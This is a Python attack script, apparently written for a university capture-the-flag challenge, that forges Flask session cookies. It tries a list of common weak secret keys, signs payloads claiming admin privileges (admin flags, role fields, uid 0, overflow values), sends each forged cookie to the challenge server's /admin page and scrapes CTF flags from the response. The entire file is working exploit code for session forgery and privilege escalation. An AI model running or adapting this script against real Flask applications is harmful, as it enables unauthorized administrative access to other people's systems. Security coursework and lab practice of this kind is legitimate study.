#!/usr/bin/env python3
"""
Flask Session Cookie Manipulation
Try to forge a Flask session cookie with admin privileges
"""

import requests
import re
from itsdangerous import URLSafeTimedSerializer, BadSignature
import json

BASE_URL = "http://challenges.iik3100-h25.iaas.iik.ntnu.no:11080"

# Common weak Flask secret keys
COMMON_SECRETS = [
    'secret',
    'dev',
    'development',
    'super-secret',
    'flask',
    'admin',
    'password',
    '123456',
    'secret-key',
    'my-secret-key',
    'change-me',
    'insecure',
    'test',
    'debug',
]

def try_forge_session(secret_key, session_data):
    """Try to forge a Flask session cookie with the given secret."""
    try:
        serializer = URLSafeTimedSerializer(secret_key)
        token = serializer.dumps(session_data)
        return token
    except Exception as e:
        return None

def test_forged_session(session_cookie):
    """Test if forged session grants admin access."""
    cookies = {'session': session_cookie}
    try:
        response = requests.get(f"{BASE_URL}/admin", cookies=cookies, timeout=5)
        
        if response.status_code == 200:
            flags = re.findall(r'CTF\{[^}]+\}', response.text)
            return True, flags
        return False, []
    except Exception:
        return False, []

def main():
    print("="*70)
    print("FLASK SESSION COOKIE FORGERY ATTACK")
    print("="*70)
    print()
    
    # Different session payloads to try
    session_payloads = [
        {'username': 'admin', 'admin': True},
        {'username': 'admin', 'is_admin': True},
        {'username': 'admin', 'role': 'admin'},
        {'username': 'admin', 'access_level': 'admin'},
        {'username': 'admin', 'access_level': 999999},
        {'username': 'admin', 'access_level': -1},
        {'username': 'admin', 'uid': 0},
        {'username': 'admin', 'id': 0},
        {'username': 'admin', 'token': 2147483647},
        {'username': 'admin', 'token': -1},
        {'username': 'administrator'},
        {'username': 'root'},
        {'admin': True},
        {'is_admin': True, 'username': 'admin'},
    ]
    
    print("[*] Attempting to forge Flask session cookies with common secrets...")
    print()
    
    for secret in COMMON_SECRETS:
        for payload in session_payloads:
            forged = try_forge_session(secret, payload)
            if forged:
                success, flags = test_forged_session(forged)
                
                if success:
                    print(f"\n[+] SUCCESS!")
                    print(f"    Secret key: {secret}")
                    print(f"    Payload: {payload}")
                    print(f"    Forged session: {forged[:50]}...")
                    
                    if flags:
                        for flag in flags:
                            if 'not_the_real' not in flag and 'bait' not in flag:
                                print(f"    🚩 {flag}")
                    return
    
    print("[-] No success with common Flask secret keys")
    print()
    print("[*] The application might be:")
    print("    - Using a strong random secret key")
    print("    - Not using Flask sessions for authentication")
    print("    - Requiring a different attack vector")


if __name__ == "__main__":
    main()
